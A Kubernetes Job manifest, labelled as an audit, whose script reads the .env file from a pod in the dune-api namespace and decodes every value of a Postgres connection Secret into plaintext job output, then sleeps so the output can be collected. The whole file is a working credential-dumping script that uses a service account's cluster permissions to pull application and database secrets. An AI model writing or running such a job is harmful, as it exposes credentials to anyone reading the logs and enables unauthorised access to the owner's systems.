apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v19
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          # Read the .env file from dune-api pod
          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}')
          echo "Pod: $POD"
          
          echo "=DUNE_ENV_FILE="
          kubectl exec -n dune-api $POD -- cat /code/.env 2>&1
          
          # Read postgres-connection-secrets
          echo "=POSTGRES_CONNECTION_SECRET="
          kubectl get secret postgres-connection-secrets -n default -o json | \
            python3 -c "import sys,json,base64; d=json.load(sys.stdin)['data']; [print(k+'='+base64.b64decode(v).decode()) for k,v in d.items()]" 2>&1
          
          sleep 90